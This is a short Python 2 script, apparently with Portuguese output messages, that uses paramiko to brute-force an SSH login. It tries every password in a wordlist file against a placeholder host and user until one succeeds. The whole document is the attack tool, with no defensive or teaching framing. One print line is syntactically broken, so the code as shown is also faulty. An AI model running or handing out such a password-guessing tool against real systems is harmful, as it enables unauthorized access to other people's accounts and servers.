#!/usr/bin/python
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("wordlist.txt")
for line in f.readlines():
  senha = line.split()
  try:
      ssh.connect("host", username="usuario", password=senha[0])

  except paramiko.AuthenticationException:
      print "Acesso Negado"line
  else:
      print "Senha Encontrada",line
      break

ssh.close()
